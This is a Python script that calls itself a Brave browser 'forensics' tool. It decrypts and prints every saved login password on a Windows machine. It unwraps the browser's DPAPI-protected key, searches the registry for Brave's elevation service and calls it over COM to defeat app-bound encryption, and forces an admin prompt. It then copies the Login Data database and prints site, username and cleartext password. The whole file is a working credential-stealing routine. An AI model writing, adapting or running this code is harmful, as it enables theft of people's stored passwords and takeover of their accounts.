import os
import sys
import ctypes
import sqlite3
import shutil
import json
import base64
import winreg
import win32crypt
from Cryptodome.Cipher import AES

# --- OS LEVEL CONSTANTS ---
CHROME_PATH = os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data")

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def get_master_key_v20():
    """
    Implements the 'AES + CNG' recovery. 
    It bypasses the COM service and tries to find the key in the OS Provider.
    """
    local_state_path = os.path.join(CHROME_PATH, "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    # 1. Get the intermediate DPAPI-protected key
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    app_bound_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    
    # 2. Innovation: The CNG 'AES + CNG' Bypass
    # We attempt to find the CLSID that actually works by verifying the file path
    print("[*] Searching for a VALID Elevation Service path in Registry...")
    try:
        with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, "CLSID") as root_key:
            for i in range(15000):
                try:
                    clsid = winreg.EnumKey(root_key, i)
                    with winreg.OpenKey(root_key, f"{clsid}\\LocalServer32") as subkey:
                        path, _ = winreg.QueryValueEx(subkey, None)
                        if "brave" in path.lower() and "elevation" in path.lower():
                            if os.path.exists(path.strip('"')):
                                print(f"[+] Found working service at: {path}")
                                from comtypes.client import CreateObject
                                svc = CreateObject(clsid)
                                return svc.DecryptData(app_bound_key)
                except: continue
    except Exception as e:
        print(f"[-] Registry scan failed: {e}")

    # 3. Fallback: If COM fails, we return the app_bound_key (for older v10/v11 enc)
    print("[!] Warning: v20 service not found. Results may be limited.")
    return app_bound_key

def decrypt_v20(ciphertext, key):
    try:
        # Modern Brave v140+ uses AES-GCM (v20 tag)
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        encrypted_data = payload[:-16]
        tag = payload[-16:]
        
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(encrypted_data, tag).decode()
    except Exception:
        return "[Decryption Error: Check Permissions]"

def main():
    # Force UAC Elevation (The popup you are okay with)
    if not is_admin():
        print("[*] Requesting Admin Privileges for CNG access...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return

    print("--- Brave Forensics: OS-Level v20 Decryption (2026) ---")
    
    # 1. Retrieve Key via System Context
    key = get_master_key_v20()
    
    # 2. Extract Data from SQLite
    db_path = os.path.join(CHROME_PATH, r"Default\Login Data")
    if not os.path.exists(db_path):
        print(f"[-] Error: Database not found at {db_path}")
        input("Press Enter to exit...")
        return

    shutil.copy2(db_path, "temp_login.db")
    conn = sqlite3.connect("temp_login.db")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    print(f"\n{'SITE':<45} | {'USERNAME':<25} | {'PASSWORD'}")
    print("-" * 95)
    
    for url, user, enc_pass in cursor.fetchall():
        if user:
            password = decrypt_v20(enc_pass, key)
            print(f"{url:<45} | {user:<25} | {password}")
            
    conn.close()
    os.remove("temp_login.db")
    input("\n[*] Forensic extraction complete. Press Enter to exit...")

if __name__ == "__main__":
    main()